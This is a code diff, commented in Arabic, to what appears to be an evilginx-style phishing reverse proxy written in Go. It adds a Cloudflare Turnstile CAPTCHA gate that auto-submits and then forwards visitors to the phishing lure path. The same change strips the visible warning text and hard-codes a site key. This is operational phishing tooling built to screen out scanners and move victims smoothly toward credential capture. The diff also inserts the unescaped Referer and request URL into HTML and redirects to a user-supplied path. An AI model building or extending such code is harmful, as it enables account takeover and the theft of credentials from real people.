@@ -1384,8 +1384,31 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	// التحقق من وجود كوكي CAPTCHA
 	captcha_cookie, err := req.Cookie("passed_captcha")
 	if err == nil && captcha_cookie.Value == "1" {
-		// المستخدم اجتاز الكابتشا، نتابع الطلب
+		// المستخدم اجتاز الكابتشا، نتابع إلى رابط lure
 		if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+			phish_host := req.Host
+			o_host, ok := p.replaceHostWithOriginal(req.Host)
+			if ok {
+				// محاولة العثور على lure path
+				for _, l := range p.cfg.lures {
+					if l.Phishlet == pl.Name {
+						if l.Hostname != "" && l.Hostname != phish_host {
+							continue
+						}
+						
+						// استخدام المسار المخصص في lure إذا وجد، وإلا استخدام مسار افتراضي
+						lure_path := "/"
+						if l.Path != "" {
+							lure_path = l.Path
+						}
+						
+						redirect_url := fmt.Sprintf("https://%s%s", phish_host, lure_path)
+						return p.javascriptRedirect(req, redirect_url)
+					}
+				}
+			}
+			
+			// إذا لم يتم العثور على lure محدد، استخدم إعادة التوجيه الافتراضية
 			redirect_url := p.cfg.PhishletConfig(pl.Name).UnauthUrl
 			if redirect_url != "" {
 				return p.javascriptRedirect(req, redirect_url)
@@ -1420,7 +1443,13 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 								expiration := time.Now().Add(24 * time.Hour)
 								cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
 								resp.Header.Set("Set-Cookie", cookie.String())
-								resp.Header.Set("Location", req.Referer())
+								
+								// تحديد المسار الذي سيتم إعادة التوجيه إليه
+								redirectPath := req.FormValue("redirect_path")
+								if redirectPath == "" {
+									redirectPath = "/"
+								}
+								resp.Header.Set("Location", redirectPath)
 								return req, resp
 							}
 						}
@@ -1434,7 +1463,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني</title>
+    <title>Security Verification</title>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         body {
@@ -1456,50 +1485,30 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
             max-width: 500px;
             text-align: center;
         }
-        h1 {
-            color: #e53935;
-            margin-bottom: 20px;
-        }
-        p {
-            color: #555;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
         .captcha-container {
             display: flex;
             justify-content: center;
             margin: 20px 0;
-        }
-        button {
-            background-color: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 15px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #3367d6;
         }
         .error {
             color: #e53935;
             margin-top: 15px;
         }
     </style>
+    <script>
+        function onCaptchaSuccess(token) {
+            document.getElementById('captcha-form').submit();
+        }
+    </script>
 </head>
 <body>
     <div class="container">
-        <h1>تحذير أمني</h1>
-        <p>للاستمرار إلى هذا الموقع، يرجى إكمال فحص الأمان أدناه للتأكد من أنك لست روبوتًا.</p>
         <div class="error">تعذر التحقق، يرجى المحاولة مرة أخرى</div>
-        <form action="/verify_captcha" method="POST">
+        <form id="captcha-form" action="/verify_captcha" method="POST">
+            <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
-            <button type="submit">تحقق والمتابعة</button>
         </form>
     </div>
 </body>
@@ -1509,7 +1518,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		return req, resp
 	}
 	
-	// عرض صفحة الكابتشا
+	// عرض صفحة الكابتشا بدون تحذير
 	captchaHTML := `<!DOCTYPE html>
 <html dir="rtl">
 <head>
@@ -1537,45 +1546,25 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
             max-width: 500px;
             text-align: center;
         }
-        h1 {
-            color: #e53935;
-            margin-bottom: 20px;
-        }
-        p {
-            color: #555;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
         .captcha-container {
             display: flex;
             justify-content: center;
             margin: 20px 0;
         }
-        button {
-            background-color: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 15px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #3367d6;
-        }
     </style>
+    <script>
+        function onCaptchaSuccess(token) {
+            document.getElementById('captcha-form').submit();
+        }
+    </script>
 </head>
 <body>
     <div class="container">
-        <h1>تحذير أمني</h1>
-        <p>للاستمرار إلى هذا الموقع، يرجى إكمال فحص الأمان أدناه للتأكد من أنك لست روبوتًا.</p>
-        <form action="/verify_captcha" method="POST">
+        <form id="captcha-form" action="/verify_captcha" method="POST">
+            <input type="hidden" name="redirect_path" value="` + req.URL.String() + `">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="YOUR_SITE_KEY" data-theme="light"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
-            <button type="submit">تحقق والمتابعة</button>
         </form>
     </div>
 </body>
